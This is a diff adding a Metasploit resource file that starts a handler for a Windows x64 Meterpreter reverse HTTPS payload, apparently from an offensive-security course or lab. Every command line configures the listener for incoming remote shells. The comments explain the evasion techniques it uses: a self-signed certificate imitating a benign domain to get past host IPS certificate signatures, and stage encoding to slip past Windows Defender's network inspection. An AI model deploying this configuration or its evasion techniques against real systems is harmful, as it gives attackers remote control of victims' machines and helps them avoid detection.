@@ -1,0 +1,23 @@
+# handler.rc — Metasploit resource file. Load with:
+#   msfconsole -q -r handler.rc
+#
+# Rationale:
+#   HandlerSSLCert         — self-signed cert mimicking a benign domain,
+#                            defeats host-based IPS certificate signatures
+#                            (Mod 14.3.1).
+#   EnableStageEncoding    — defeats network-traffic signatures on the
+#   StageEncoder           — default Meterpreter second stage. Windows
+#                            Defender's WdNisSvc inspects network traffic
+#                            against signatures; this is what stops it.
+#   ExitOnSession false    — catch multiple shells across the engagement
+#                            without restarting the handler.
+
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 192.168.119.120
+set LPORT 443
+set HandlerSSLCert /home/kali/self_cert/nasa.pem
+set EnableStageEncoding true
+set StageEncoder x64/zutto_dekiru
+set ExitOnSession false
+exploit -j
